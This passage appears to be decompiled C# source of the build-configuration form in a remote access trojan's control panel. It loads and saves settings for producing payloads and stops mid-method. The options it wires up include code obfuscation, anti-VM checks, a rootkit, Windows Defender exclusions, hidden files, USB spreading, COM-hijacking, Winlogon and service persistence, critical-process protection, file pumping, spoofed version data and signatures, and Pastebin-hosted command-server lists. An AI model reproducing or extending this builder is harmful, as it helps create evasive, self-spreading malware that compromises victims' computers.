using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using CustomControls.RJControls;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using MaterialSkin;
using MaterialSkin.Controls;
using Newtonsoft.Json;
using Obfuscator.Obfuscator.CtrlFlow;
using Obfuscator.Obfuscator.IntProtect;
using Obfuscator.Obfuscator.Junk;
using Obfuscator.Obfuscator.ManyProxy;
using Obfuscator.Obfuscator.Mixer;
using Obfuscator.Obfuscator.Proxy;
using Obfuscator.Obfuscator.Rename;
using Server.Data;
using Server.Helper;
using Server.Helper.Bulider;
using Vestris.ResourceLib;

namespace Server.Forms;

public class FormBulider : FormMaterial
{
	private IContainer components;

	private MaterialTabControl materialTabControl1;

	private TabPage tabPage1;

	private TabPage tabPage2;

	private TabPage tabPage3;

	private TabPage tabPage4;

	private TabPage tabPage5;

	private DataGridView GridBuilds;

	private DataGridViewTextBoxColumn ColumnBuildName;

	private DataGridViewTextBoxColumn ColumnGroup;

	private DataGridViewTextBoxColumn ColumnProcess;

	private DataGridViewTextBoxColumn ColumnUsers;

	private DataGridViewTextBoxColumn ColumnDateCreated;

	private DataGridViewTextBoxColumn ColumnBuildPath;

	private ContextMenuStrip contextMenuBuilds;

	private ToolStripMenuItem menuDelete;

	private ToolStripMenuItem menuClear;

	private DataGridViewTextBoxColumn Column1;

	private RJButton rjButton2;

	private RJTextBox rjTextBox1;

	private RJButton rjButton1;

	private CheckBox checkBox1;

	private Panel panel1;

	private CheckBox checkBox4;

	private RJTextBox rjTextBox3;

	private RJComboBox rjComboBox1;

	private CheckBox checkBox5;

	private RJComboBox rjComboBox2;

	private RJTextBox rjTextBox4;

	private CheckBox checkBox6;

	private RJTextBox rjTextBox5;

	private CheckBox checkBox8;

	private CheckBox checkBox9;

	private CheckBox checkBox20;

	private PictureBox pictureBox1;

	private Panel panel4;

	private RJButton rjButton3;

	private RJButton rjButtonGenerateAssembly;

	private CheckBox checkBox21;

	private RJTextBox TextBoxFileVersion;

	private RJTextBox TextBoxProductVersion;

	private RJTextBox TextBoxOriginalFileName;

	private RJTextBox TextBoxTrademarks;

	private RJTextBox TextBoxCopyright;

	private RJTextBox TextBoxCompany;

	private RJTextBox TextBoxDescription;

	private RJTextBox TextBoxProduct;

	private RJTextBox rjTextBox7;

	private RJButton rjButton5;

	private CheckBox checkBox22;

	private CheckBox checkBoxCtrlFlow;

	private CheckBox checkBoxJunk;

	private CheckBox checkBoxProxyInt;

	private CheckBox checkBoxRename;

	private CheckBox checkBoxMixer;

	private CheckBox checkBoxProtectInt;

	private CheckBox checkBoxProxyString;

	private CheckBox checkBoxAntiVirtual;

	private DataGridView GridIps;

	private RJButton rjButton4;

	private RJTextBox rjTextBox6;

	public RJTextBox rjTextBox2;

	private RJButton rjButton6;

	private ImageList imageList1;

	private RJButton rjButton7;

	private RJButton rjButton8;

	private RJButton rjButton9;

	private RJButton rjButton10;

	private RJButton rjButtonBuildJar;

	private RJButton rjButtonBuildVMP;

	private RJButton rjButtonBuildReactor;

	private RJButton rjButtonBuildMpress;

	private RJButton rjButtonBuildDonut;

	private RJButton rjButtonBuildSFX;

	private CheckBox checkBox7;

	private RJButton rjButton12;

	private RJButton rjButton11;

	private RJButton rjButton13;

	private RJButton rjButton14;

	private RJButton rjButton15;

	private RJTextBox rjTextBox8;

	private CheckBox checkBox3;

	private RJComboBox rjComboBox3;

	private CheckBox checkBoxCmdlineAutorun;

	private RJComboBox rjComboBoxCmdlineDir;

	private RJTextBox rjTextBoxCmdlineProcess;

	private CheckBox checkBoxWinlogonShell;

	private CheckBox checkBoxProcessCritical;

	private RJTextBox rjTextBoxProcessCritical;

	private CheckBox checkBoxReserved;

	private RJTextBox rjTextBoxReserved;

	private CheckBox checkBoxWMIStartup;

	private RJTextBox rjTextBoxWMIStartup;

	private CheckBox checkBoxUSBSpread;

	private RJTextBox rjTextBoxUSBSpread;

	private CheckBox checkBoxWindowsService;

	private RJTextBox rjTextBoxWindowsService;

	private CheckBox checkBox11;

	private RJComboBox rjComboBox4;

	private RJTextBox rjTextBox10;

	private CheckBox checkBox12;

	private RJTextBox rjTextBox11;

	private CheckBox checkBox13;

	private RJTextBox rjTextBox12;

	private CheckBox checkBox14;

	private RJTextBox rjTextBox13;

	private RJComboBox rjComboBox5;

	private RJTextBox rjTextBox9;

	private CheckBox checkBox2;

	private RJButton rjButton16;

	private RJButton rjButton17;

	private RJButton rjButton18;

	private RJButton rjButton21;

	private RJButton rjButton20;

	private RJButton rjButton19;

	private CheckBox checkBox10;

	private CheckBox checkBox15;

	public FormBulider()
	{
		InitializeComponent();
	}

	private string GetSelectedExtension()
	{
		if (rjComboBox3.SelectedItem != null)
		{
			string extension = rjComboBox3.SelectedItem.ToString().Trim();
			if (extension.Contains(" "))
			{
				extension = extension.Substring(0, extension.IndexOf(" "));
			}
			if (extension.StartsWith("."))
			{
				extension = extension.Substring(1);
			}
			if (Array.IndexOf(new string[21]
			{
				"exe", "scr", "com", "pif", "sys", "cpl", "msi", "msc", "app", "gadget",
				"bat", "cmd", "vbs", "js", "ps1", "wsf", "wsh", "hta", "lnk", "sh",
				"pl"
			}, extension.ToLower()) >= 0)
			{
				return "." + extension.ToLower();
			}
		}
		return ".exe";
	}

	private string GetFileFilter()
	{
		return ".exe (*.exe)|*.exe|.scr (*.scr)|*.scr|.com (*.com)|*.com|.pif (*.pif)|*.pif|.sys (*.sys)|*.sys|.cpl (*.cpl)|*.cpl|.msi (*.msi)|*.msi|.msc (*.msc)|*.msc|.app (*.app)|*.app|.gadget (*.gadget)|*.gadget|.bat (*.bat)|*.bat|.cmd (*.cmd)|*.cmd|.vbs (*.vbs)|*.vbs|.js (*.js)|*.js|.ps1 (*.ps1)|*.ps1|.wsf (*.wsf)|*.wsf|.wsh (*.wsh)|*.wsh|.hta (*.hta)|*.hta|.lnk (*.lnk)|*.lnk|.sh (*.sh)|*.sh|.pl (*.pl)|*.pl";
	}

	private void FormBulider_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		if (File.Exists("local\\Settings.json"))
		{
			Settings settings = JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json"));
			rjTextBox1.Texts = "127.0.0.1:" + string.Join(",", settings.Ports);
		}
		if (File.Exists("local\\Bulider.json"))
		{
			BulidData bulidData = JsonConvert.DeserializeObject<BulidData>(File.ReadAllText("local\\Bulider.json"));
			checkBox20.Checked = bulidData.CheckIcon;
			checkBox21.Checked = bulidData.CheckAssembly;
			checkBox22.Checked = bulidData.DigitalSignature;
			checkBoxAntiVirtual.Checked = bulidData.AntiVirtual;
			checkBoxCtrlFlow.Checked = bulidData.ctrflow;
			checkBoxJunk.Checked = bulidData.Junk;
			checkBoxProxyInt.Checked = bulidData.ProxyInt;
			checkBoxRename.Checked = bulidData.Rename;
			checkBoxMixer.Checked = bulidData.Mixcer;
			checkBoxProtectInt.Checked = bulidData.ProtectInt;
			checkBoxProxyString.Checked = bulidData.ProxyStr;
			checkBox15.Checked = bulidData.ManyProxy;
			checkBox10.Checked = bulidData.ProxyCall;
			if (bulidData.CheckIcon)
			{
				File.WriteAllBytes("local\\temp.ico", bulidData.Icon);
				pictureBox1.ImageLocation = "local\\temp.ico";
			}
			string[] hosts = bulidData.Hosts;
			foreach (string value in hosts)
			{
				DataGridViewRow dataGridViewRow = new DataGridViewRow();
				dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
				{
					Value = value
				});
				GridIps.Rows.Add(dataGridViewRow);
			}
			TextBoxProduct.Texts = bulidData.Product;
			TextBoxDescription.Texts = bulidData.Description;
			TextBoxCompany.Texts = bulidData.Company;
			TextBoxCopyright.Texts = bulidData.Copyright;
			TextBoxTrademarks.Texts = bulidData.Trademarks;
			TextBoxOriginalFileName.Texts = bulidData.OriginalFilename;
			TextBoxProductVersion.Texts = bulidData.ProductVersion;
			TextBoxFileVersion.Texts = bulidData.FileVersion;
			checkBox1.Checked = bulidData.Install;
			checkBox2.Checked = bulidData.ProcessName;
			rjTextBox9.Texts = bulidData.ProcessNameValue ?? "";
			checkBox2_CheckedChanged(null, EventArgs.Empty);
			checkBoxWinlogonShell.Checked = bulidData.WinlogonShell;
			checkBox8.Checked = bulidData.ExclusionWD;
			checkBox6.Checked = bulidData.HiddenFile;
			checkBox4.Checked = bulidData.RootKit;
			checkBox9.Checked = bulidData.Pump;
			checkBox7.Checked = bulidData.UserInit;
			checkBox5.Checked = bulidData.InstallWatchDog;
			checkBoxProcessCritical.Checked = bulidData.ProcessCritical;
			rjTextBoxProcessCritical.Texts = bulidData.ProcessCriticalName ?? "";
			checkBoxProcessCritical_CheckedChanged(null, EventArgs.Empty);
			rjTextBoxReserved.Texts = bulidData.COMHijackingCLSID ?? "";
			checkBoxReserved.Checked = bulidData.COMHijacking;
			checkBoxReserved_CheckedChanged(null, EventArgs.Empty);
			checkBoxWMIStartup.Checked = bulidData.InstallServices;
			rjTextBoxWMIStartup.Texts = bulidData.InstallServicesValue ?? "";
			checkBoxWMIStartup_CheckedChanged(null, EventArgs.Empty);
			checkBoxUSBSpread.Checked = bulidData.USBSpread;
			rjTextBoxUSBSpread.Texts = bulidData.USBSpreadValue ?? "";
			checkBoxUSBSpread_CheckedChanged(null, EventArgs.Empty);
			checkBoxWindowsService.Checked = bulidData.WindowsService;
			rjTextBoxWindowsService.Texts = bulidData.WindowsServiceName ?? "";
			checkBoxWindowsService_CheckedChanged(null, EventArgs.Empty);
			rjTextBox2.Texts = bulidData.TaskClient;
			rjTextBox5.Texts = bulidData.TaskWatchDog;
			rjComboBox1.Texts = bulidData.PathClientCmb;
			rjTextBox3.Texts = bulidData.PathClientBox;
			rjComboBox2.Texts = bulidData.PathWatchDogCmb;
			rjTextBox4.Texts = bulidData.PathWatchDogBox;
			rjTextBox7.Texts = bulidData.Group;
			rjTextBox6.Texts = bulidData.Mutex;
			checkBoxCmdlineAutorun.Checked = bulidData.CmdlineAutorun;
			rjComboBoxCmdlineDir.Texts = bulidData.CmdlineDir ?? "%Windows%";
			rjTextBoxCmdlineProcess.Texts = bulidData.CmdlineProcessName ?? "";
			checkBoxCmdlineAutorun_CheckedChanged(null, EventArgs.Empty);
			if (bulidData.UsePastebin)
			{
				checkBox3.Checked = bulidData.UsePastebin;
				rjTextBox8.Texts = bulidData.PastebinUrl ?? "";
			}
			checkBox11.Checked = bulidData.InstallArchive;
			if (!string.IsNullOrEmpty(bulidData.ArchiveType))
			{
				rjComboBox4.Texts = bulidData.ArchiveType;
			}
			rjTextBox10.Texts = bulidData.ArchiveName ?? "";
			checkBox12.Checked = bulidData.ArchivePassword;
			rjTextBox11.Texts = bulidData.ArchivePasswordValue ?? "";
			checkBox13.Checked = bulidData.BuildNameInArchive;
			rjTextBox12.Texts = bulidData.BuildNameValue ?? "";
			checkBox14.Checked = bulidData.BuildPumpArchive;
			rjTextBox13.Texts = bulidData.BuildPumpSize ?? "";
			if (!string.IsNullOrEmpty(bulidData.BuildPumpUnit))
			{
				rjComboBox5.Texts = bulidData.BuildPumpUnit;
			}
			checkBox11_CheckedChanged(null, EventArgs.Empty);
			checkBox12_CheckedChanged(null, EventArgs.Empty);
			checkBox13_CheckedChanged(null, EventArgs.Empty);
			checkBox14_CheckedChanged(null, EventArgs.Empty);
			if (!string.IsNullOrEmpty(bulidData.SelectedExtension))
			{
				string searchExt = (bulidData.SelectedExtension.StartsWith(".") ? bulidData.SelectedExtension.Substring(1) : bulidData.SelectedExtension);
				int foundIndex = -1;
				for (int j = 0; j < rjComboBox3.Items.Count; j++)
				{
					string item = rjComboBox3.Items[j].ToString();
					if (item.StartsWith("." + searchExt, StringComparison.OrdinalIgnoreCase) || item.StartsWith(searchExt, StringComparison.OrdinalIgnoreCase))
					{
						foundIndex = j;
						break;
					}
				}
				if (foundIndex >= 0)
				{
					rjComboBox3.SelectedIndex = foundIndex;
				}
				else
				{
					rjComboBox3.SelectedIndex = 0;
				}
			}
			else
			{
				rjComboBox3.SelectedIndex = 0;
			}
		}
		else
		{
			checkBox20.Checked = true;
			checkBox21.Checked = true;
			checkBox22.Checked = true;
			checkBoxAntiVirtual.Checked = true;
			checkBoxCtrlFlow.Checked = true;
			checkBoxJunk.Checked = true;
			checkBoxProxyInt.Checked = true;
			checkBoxRename.Checked = true;
			checkBoxMixer.Checked = true;
			checkBoxProtectInt.Checked = true;
			checkBoxProxyString.Checked = true;
			checkBox10.Checked = true;
			checkBox15.Checked = true;
		}
		checkBox20.CheckedChanged += checkBox20_CheckedChanged;
		checkBox2.CheckedChanged += checkBox2_CheckedChanged;
		checkBox3.CheckedChanged += checkBox3_CheckedChanged;
		checkBox11.CheckedChanged += checkBox11_CheckedChanged;
		checkBox12.CheckedChanged += checkBox12_CheckedChanged;
		checkBox13.CheckedChanged += checkBox13_CheckedChanged;
		checkBox14.CheckedChanged += checkBox14_CheckedChanged;
		if (rjComboBox3.Items.Count > 0 && rjComboBox3.SelectedIndex < 0)
		{
			rjComboBox3.SelectedIndex = 0;
		}
		if (checkBox3 != null)
		{
			checkBox3_CheckedChanged(checkBox3, EventArgs.Empty);
		}
		try
		{
			string basePath = AppDomain.CurrentDomain.BaseDirectory;
			string iconFolder = "";
			string[] hosts = new string[3]
			{
				Path.Combine(basePath, "Plugins Liberium и т.д", "icon"),
				Path.Combine(basePath, "..", "..", "..", "Plugins Liberium и т.д", "icon"),
				Path.Combine(basePath, "icon")
			};
			foreach (string folder in hosts)
			{
				if (Directory.Exists(folder))
				{
					iconFolder = folder;
					break;
				}
			}
			if (!string.IsNullOrEmpty(iconFolder))
			{
				string deleteIconPath = Path.Combine(iconFolder, "Form1_removeToolStripMenuItem-Image.png");
				string clearIconPath = Path.Combine(iconFolder, "Form1_clearToolStripMenuItem-Image.png");
				if (File.Exists(deleteIconPath))
				{
					menuDelete.Image = Image.FromFile(deleteIconPath);
				}
				if (File.Exists(clearIconPath))
				{
					menuClear.Image = Image.FromFile(clearIconPath);
				}
			}
			else
			{
				string deletePath = Path.Combine(basePath, "delete.png");
				string clearPath = Path.Combine(basePath, "clear.png");
				if (File.Exists(deletePath))
				{
					menuDelete.Image = Image.FromFile(deletePath);
				}
				if (File.Exists(clearPath))
				{
					menuClear.Image = Image.FromFile(clearPath);
				}
			}
		}
		catch
		{
		}
		LoadBuilds();
		base.FormClosing += delegate
		{
			BulidData bulidData2 = new BulidData
			{
				CheckIcon = checkBox20.Checked,
				CheckAssembly = checkBox21.Checked,
				DigitalSignature = checkBox22.Checked,
				AntiVirtual = checkBoxAntiVirtual.Checked,
				ctrflow = checkBoxCtrlFlow.Checked,
				Junk = checkBoxJunk.Checked,
				ProxyInt = checkBoxProxyInt.Checked,
				Rename = checkBoxRename.Checked,
				Mixcer = checkBoxMixer.Checked,
				ProtectInt = checkBoxProtectInt.Checked,
				ProxyStr = checkBoxProxyString.Checked,
				ProxyCall = checkBox10.Checked,
				ManyProxy = checkBox15.Checked,
				Icon = (checkBox20.Checked ? File.ReadAllBytes(pictureBox1.ImageLocation) : null),
				Product = TextBoxProduct.Texts,
				Description = TextBoxDescription.Texts,
				Company = TextBoxCompany.Texts,
				Copyright = TextBoxCopyright.Texts,
				Trademarks = TextBoxTrademarks.Texts,
				OriginalFilename = TextBoxOriginalFileName.Texts,
				ProductVersion = TextBoxProductVersion.Texts,
				FileVersion = TextBoxFileVersion.Texts,
				Install = checkBox1.Checked,
				ProcessName = checkBox2.Checked,
				ProcessNameValue = (rjTextBox9.Texts ?? ""),
				ExclusionWD = checkBox8.Checked,
				HiddenFile = checkBox6.Checked,
				RootKit = checkBox4.Checked,
				Pump = checkBox9.Checked,
				UserInit = checkBox7.Checked,
				InstallWatchDog = checkBox5.Checked,
				ProcessCritical = checkBoxProcessCritical.Checked,
				ProcessCriticalName = (rjTextBoxProcessCritical.Texts ?? ""),
				WinlogonShell = checkBoxWinlogonShell.Checked,
				COMHijacking = checkBoxReserved.Checked,
				COMHijackingCLSID = (rjTextBoxReserved.Texts ?? ""),
				InstallServices = checkBoxWMIStartup.Checked,
				InstallServicesValue = (rjTextBoxWMIStartup.Texts ?? ""),
				USBSpread = checkBoxUSBSpread.Checked,
				USBSpreadValue = (rjTextBoxUSBSpread.Texts ?? ""),
				WindowsService = checkBoxWindowsService.Checked,
				WindowsServiceName = (rjTextBoxWindowsService.Texts ?? ""),
				TaskClient = rjTextBox2.Texts,
				TaskWatchDog = rjTextBox5.Texts,
				PathClientCmb = rjComboBox1.Texts,
				PathClientBox = rjTextBox3.Texts,
				PathWatchDogCmb = rjComboBox2.Texts,
				PathWatchDogBox = rjTextBox4.Texts,
				Group = rjTextBox7.Texts,
				Mutex = rjTextBox6.Texts,
				CmdlineAutorun = checkBoxCmdlineAutorun.Checked,
				CmdlineDir = rjComboBoxCmdlineDir.Texts,
				CmdlineProcessName = rjTextBoxCmdlineProcess.Texts,
				UsePastebin = checkBox3.Checked,
				PastebinUrl = rjTextBox8.Texts,
				InstallArchive = checkBox11.Checked,
				ArchiveType = rjComboBox4.Texts,
				ArchiveName = rjTextBox10.Texts,
				ArchivePassword = checkBox12.Checked,
				ArchivePasswordValue = rjTextBox11.Texts,
				BuildNameInArchive = checkBox13.Checked,
				BuildNameValue = rjTextBox12.Texts,
				BuildPumpArchive = checkBox14.Checked,
				BuildPumpSize = rjTextBox13.Texts,
				BuildPumpUnit = rjComboBox5.Texts
			};
			if (rjComboBox3.SelectedItem != null)
			{
				string text = rjComboBox3.SelectedItem.ToString().Trim();
				if (text.Contains(" "))
				{
					text = text.Substring(0, text.IndexOf(" "));
				}
				if (text.StartsWith("."))
				{
					text = text.Substring(1);
				}
				bulidData2.SelectedExtension = text.ToLower();
			}
			else
			{
				bulidData2.SelectedExtension = "exe";
			}
			List<string> list = new List<string>();
			foreach (DataGridViewRow dataGridViewRow2 in (IEnumerable)GridIps.Rows)
			{
				list.Add((string)dataGridViewRow2.Cells[0].Value);
			}
			bulidData2.Hosts = list.ToArray();
			File.WriteAllText("local\\Bulider.json", JsonConvert.SerializeObject(bulidData2, Formatting.Indented));
		};
	}

	private void ChangeScheme(object sender)
	{
		Color primary = FormMaterial.PrimaryColor;
		bool isDark = MaterialSkinManager.Instance.Theme == MaterialSkinManager.Themes.DARK;
		Color back = (isDark ? Color.FromArgb(40, 40, 40) : SystemColors.Window);
		Color text = (isDark ? Color.WhiteSmoke : SystemColors.WindowText);
		rjTextBox1.BorderColor = primary;
		rjTextBox2.BorderColor = primary;
		rjTextBox3.BorderColor = primary;
		rjTextBox4.BorderColor = primary;
		rjTextBox5.BorderColor = primary;
		rjTextBox6.BorderColor = primary;
		rjTextBox7.BorderColor = primary;
		rjTextBox8.BorderColor = primary;
		rjTextBox9.BorderColor = primary;
		rjTextBoxCmdlineProcess.BorderColor = primary;
		rjTextBoxProcessCritical.BorderColor = primary;
		rjTextBoxReserved.BorderColor = primary;
		rjTextBoxWMIStartup.BorderColor = primary;
		rjTextBoxUSBSpread.BorderColor = primary;
		rjTextBoxWindowsService.BorderColor = primary;
		rjTextBox10.BorderColor = primary;
		rjTextBox11.BorderColor = primary;
		rjTextBox12.BorderColor = primary;
		rjTextBox13.BorderColor = primary;
		TextBoxOriginalFileName.BorderColor = primary;
		TextBoxDescription.BorderColor = primary;
		TextBoxCompany.BorderColor = primary;
		TextBoxProduct.BorderColor = primary;
		TextBoxCopyright.BorderColor = primary;
		TextBoxTrademarks.BorderColor = primary;
		TextBoxFileVersion.BorderColor = primary;
		TextBoxProductVersion.BorderColor = primary;
		rjComboBox1.BorderColor = primary;
		rjComboBox2.BorderColor = primary;
		rjComboBox3.BorderColor = primary;
		rjComboBox4.BorderColor = primary;
		rjComboBox5.BorderColor = primary;
		rjComboBoxCmdlineDir.BorderColor = primary;
		rjComboBox1.IconColor = primary;
		rjComboBox2.IconColor = primary;
		rjComboBoxCmdlineDir.IconColor = primary;
		rjComboBox3.IconColor = primary;
		rjComboBox4.IconColor = primary;
		rjComboBox5.IconColor = primary;
		rjTextBox1.BackColor = back;
		rjTextBox2.BackColor = back;
		rjTextBox3.BackColor = back;
		rjTextBox4.BackColor = back;
		rjTextBox5.BackColor = back;
		rjTextBox6.BackColor = back;
		rjTextBox7.BackColor = back;
		rjTextBox8.BackColor = back;
		rjTextBox9.BackColor = back;
		rjTextBoxCmdlineProcess.BackColor = back;
		rjTextBoxProcessCritical.BackColor = back;
		rjTextBoxReserved.BackColor = back;
		rjTextBoxWMIStartup.BackColor = back;
		rjTextBoxUSBSpread.BackColor = back;
		rjTextBoxWindowsService.BackColor = back;
		rjTextBox10.BackColor = back;
		rjTextBox11.BackColor = back;
		rjTextBox12.BackColor = back;
		rjTextBox13.BackColor = back;
		TextBoxOriginalFileName.BackColor = back;
		TextBoxDescription.BackColor = back;
		TextBoxCompany.BackColor = back;
		TextBoxProduct.BackColor = back;
		TextBoxCopyright.BackColor = back;
		TextBoxTrademarks.BackColor = back;
		TextBoxFileVersion.BackColor = back;
		TextBoxProductVersion.BackColor = back;
		rjTextBox1.ForeColor = text;
		rjTextBox2.ForeColor = text;
		rjTextBox3.ForeColor = text;
		rjTextBox4.ForeColor = text;
		rjTextBox5.ForeColor = text;
		rjTextBox6.ForeColor = text;
		rjTextBox7.ForeColor = text;
		rjTextBox8.ForeColor = text;
		rjTextBox9.ForeColor = text;
		rjTextBoxCmdlineProcess.ForeColor = text;
		rjTextBoxProcessCritical.ForeColor = text;
		rjTextBoxReserved.ForeColor = text;
		rjTextBoxWMIStartup.ForeColor = text;
		rjTextBoxUSBSpread.ForeColor = text;
		rjTextBoxWindowsService.ForeColor = text;
		rjTextBox10.ForeColor = text;
		rjTextBox11.ForeColor = text;
		rjTextBox12.ForeColor = text;
		rjTextBox13.ForeColor = text;
		TextBoxOriginalFileName.ForeColor = text;
		TextBoxDescription.ForeColor = text;
		TextBoxCompany.ForeColor = text;
		TextBoxProduct.ForeColor = text;
		TextBoxCopyright.ForeColor = text;
		TextBoxTrademarks.ForeColor = text;
		TextBoxFileVersion.ForeColor = text;
		TextBoxProductVersion.ForeColor = text;
		rjComboBox1.BackColor = back;
		rjComboBox1.ForeColor = text;
		rjComboBox1.ListBackColor = back;
		rjComboBox1.ListTextColor = text;
		rjComboBox2.BackColor = back;
		rjComboBox2.ForeColor = text;
		rjComboBox2.ListBackColor = back;
		rjComboBox2.ListTextColor = text;
		rjComboBoxCmdlineDir.BackColor = back;
		rjComboBoxCmdlineDir.ForeColor = text;
		rjComboBoxCmdlineDir.ListBackColor = back;
		rjComboBoxCmdlineDir.ListTextColor = text;
		rjComboBox3.BackColor = back;
		rjComboBox3.ForeColor = text;
		rjComboBox3.ListBackColor = back;
		rjComboBox3.ListTextColor = text;
		rjComboBox4.BackColor = back;
		rjComboBox4.ForeColor = text;
		rjComboBox4.ListBackColor = back;
		rjComboBox4.ListTextColor = text;
		rjComboBox5.BackColor = back;
		rjComboBox5.ForeColor = text;
		rjComboBox5.ListBackColor = back;
		rjComboBox5.ListTextColor = text;
		rjButton1.BackColor = primary;
		rjButton2.BackColor = primary;
		rjButton3.BackColor = primary;
		rjButtonGenerateAssembly.BackColor = primary;
		rjButtonGenerateAssembly.BackgroundColor = primary;
		rjButton4.BackColor = primary;
		rjButton5.BackColor = primary;
		rjButton6.BackColor = primary;
		rjButton7.BackColor = primary;
		rjButton8.BackColor = primary;
		rjButton9.BackColor = primary;
		rjButton10.BackColor = primary;
		rjButton11.BackColor = primary;
		rjButton12.BackColor = primary;
		rjButton13.BackColor = primary;
		rjButton14.BackColor = primary;
		rjButton15.BackColor = primary;
		rjButtonBuildJar.BackColor = primary;
		rjButtonBuildJar.BackgroundColor = primary;
		rjButtonBuildJar.TextColor = Color.White;
		rjButtonBuildJar.ForeColor = Color.White;
		rjButtonBuildVMP.BackColor = primary;
		rjButtonBuildVMP.BackgroundColor = primary;
		rjButtonBuildVMP.TextColor = Color.White;
		rjButtonBuildVMP.ForeColor = Color.White;
		rjButtonBuildReactor.BackColor = primary;
		rjButtonBuildReactor.BackgroundColor = primary;
		rjButtonBuildReactor.TextColor = Color.White;
		rjButtonBuildReactor.ForeColor = Color.White;
		rjButtonBuildMpress.BackColor = primary;
		rjButtonBuildMpress.BackgroundColor = primary;
		rjButtonBuildMpress.TextColor = Color.White;
		rjButtonBuildMpress.ForeColor = Color.White;
		rjButtonBuildDonut.BackColor = primary;
		rjButtonBuildDonut.BackgroundColor = primary;
		rjButtonBuildDonut.TextColor = Color.White;
		rjButtonBuildDonut.ForeColor = Color.White;
		rjButtonBuildSFX.BackColor = primary;
		rjButtonBuildSFX.BackgroundColor = primary;
		rjButtonBuildSFX.TextColor = Color.White;
		rjButtonBuildSFX.ForeColor = Color.White;
		rjButton16.BackColor = primary;
		rjButton16.BackgroundColor = primary;
		rjButton16.TextColor = Color.White;
		rjButton16.ForeColor = Color.White;
		rjButton17.BackColor = primary;
		rjButton17.BackgroundColor = primary;
		rjButton17.TextColor = Color.White;
		rjButton17.ForeColor = Color.White;
		rjButton18.BackColor = primary;
		rjButton18.BackgroundColor = primary;
		rjButton18.TextColor = Color.White;
		rjButton18.ForeColor = Color.White;
		rjButton19.BackColor = primary;
		rjButton19.BackgroundColor = primary;
		rjButton19.TextColor = Color.White;
		rjButton19.ForeColor = Color.White;
		rjButton20.BackColor = primary;
		rjButton20.BackgroundColor = primary;
		rjButton20.TextColor = Color.White;
		rjButton20.ForeColor = Color.White;
		rjButton21.BackColor = primary;
		rjButton21.BackgroundColor = primary;
		rjButton21.TextColor = Color.White;
		rjButton21.ForeColor = Color.White;
		if (checkBox3 != null)
		{
			checkBox3.ForeColor = text;
		}
		if (checkBoxCmdlineAutorun != null)
		{
			checkBoxCmdlineAutorun.ForeColor = text;
		}
		if (checkBox2 != null)
		{
			checkBox2.ForeColor = text;
		}
		if (checkBoxWinlogonShell != null)
		{
			checkBoxWinlogonShell.ForeColor = text;
		}
		if (checkBoxProcessCritical != null)
		{
			checkBoxProcessCritical.ForeColor = text;
		}
		if (checkBoxWMIStartup != null)
		{
			checkBoxWMIStartup.ForeColor = text;
		}
		if (checkBoxUSBSpread != null)
		{
			checkBoxUSBSpread.ForeColor = text;
		}
		if (checkBoxCtrlFlow != null)
		{
			checkBoxCtrlFlow.ForeColor = text;
		}
		if (checkBoxJunk != null)
		{
			checkBoxJunk.ForeColor = text;
		}
		if (checkBoxProxyInt != null)
		{
			checkBoxProxyInt.ForeColor = text;
		}
		if (checkBoxRename != null)
		{
			checkBoxRename.ForeColor = text;
		}
		if (checkBoxMixer != null)
		{
			checkBoxMixer.ForeColor = text;
		}
		if (checkBoxProtectInt != null)
		{
			checkBoxProtectInt.ForeColor = text;
		}
		if (checkBoxProxyString != null)
		{
			checkBoxProxyString.ForeColor = text;
		}
		if (checkBox10 != null)
		{
			checkBox10.ForeColor = text;
		}
		if (checkBox15 != null)
		{
			checkBox15.ForeColor = text;
		}
		if (checkBoxAntiVirtual != null)
		{
			checkBoxAntiVirtual.ForeColor = text;
		}
		if (checkBox1 != null)
		{
			checkBox1.ForeColor = text;
		}
		if (checkBox4 != null)
		{
			checkBox4.ForeColor = text;
		}
		if (checkBox5 != null)
		{
			checkBox5.ForeColor = text;
		}
		if (checkBox6 != null)
		{
			checkBox6.ForeColor = text;
		}
		if (checkBox7 != null)
		{
			checkBox7.ForeColor = text;
		}
		if (checkBox8 != null)
		{
			checkBox8.ForeColor = text;
		}
		if (checkBox9 != null)
		{
			checkBox9.ForeColor = text;
		}
		if (checkBox20 != null)
		{
			checkBox20.ForeColor = text;
		}
		if (checkBox22 != null)
		{
			checkBox22.ForeColor = text;
		}
		if (checkBoxReserved != null)
		{
			checkBoxReserved.ForeColor = text;
		}
		if (checkBoxWindowsService != null)
		{
			checkBoxWindowsService.ForeColor = text;
		}
		foreach (TabPage tabPage in materialTabControl1.TabPages)
		{
			tabPage.BackColor = back;
			tabPage.ForeColor = text;
		}
		contextMenuBuilds.BackColor = back;
		contextMenuBuilds.ForeColor = text;
		contextMenuBuilds.RenderMode = ToolStripRenderMode.Professional;
		contextMenuBuilds.Renderer = new ToolStripProfessionalRenderer(isDark ? ((ProfessionalColorTable)new DarkColorTable()) : ((ProfessionalColorTable)new LightColorTable()));
		menuDelete.BackColor = back;
		menuDelete.ForeColor = text;
		menuClear.BackColor = back;
		menuClear.ForeColor = text;
		if (isDark)
		{
			GridIps.BackgroundColor = Color.FromArgb(40, 40, 40);
			if (GridIps.ColumnHeadersDefaultCellStyle != null)
			{
				GridIps.ColumnHeadersDefaultCellStyle.BackColor = Color.FromArgb(40, 40, 40);
				GridIps.ColumnHeadersDefaultCellStyle.SelectionBackColor = Color.FromArgb(40, 40, 40);
				GridIps.ColumnHeadersDefaultCellStyle.ForeColor = primary;
				GridIps.ColumnHeadersDefaultCellStyle.SelectionForeColor = primary;
			}
			if (GridIps.DefaultCellStyle != null)
			{
				GridIps.DefaultCellStyle.BackColor = Color.FromArgb(64, 64, 64);
				GridIps.DefaultCellStyle.ForeColor = primary;
				GridIps.DefaultCellStyle.SelectionBackColor = primary;
				GridIps.DefaultCellStyle.SelectionForeColor = Color.White;
			}
			if (GridBuilds == null)
			{
				return;
			}
			GridBuilds.BackgroundColor = Color.FromArgb(40, 40, 40);
			if (GridBuilds.ColumnHeadersDefaultCellStyle != null)
			{
				GridBuilds.ColumnHeadersDefaultCellStyle.BackColor = Color.FromArgb(40, 40, 40);
